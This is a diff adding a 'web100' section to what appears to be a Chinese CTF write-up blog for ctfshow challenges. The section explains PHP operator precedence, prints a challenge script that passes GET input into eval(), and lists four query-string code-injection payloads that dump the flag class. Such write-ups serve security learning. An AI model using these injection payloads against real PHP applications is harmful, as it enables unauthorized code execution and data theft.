@@ -51,6 +51,7 @@
 <li><a href="#web94">web94</a></li>
 <li><a href="#web97">web97</a></li>
 <li><a href="#web99">web99</a></li>
+<li><a href="#web100">web100</a></li>
 </ul>
 </li>
 </ul>
@@ -547,6 +548,19 @@
 <blockquote>
 <p> n&#x3D;1.php自动转换为1</p>
 </blockquote>
+<h4><span id="web100">web100</span></h4><p>运算符优先级：**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p>
+<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p>
+<p>是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
+<p>**var_dump()**函数可以输出多个值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>v3的话要加注释也行,不加也能运行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">或?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p>
 <p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p>
 <p><img src="/2023/04/19/ctfshow/image-20230419181149917.png" alt="image-20230419181149917"></p>
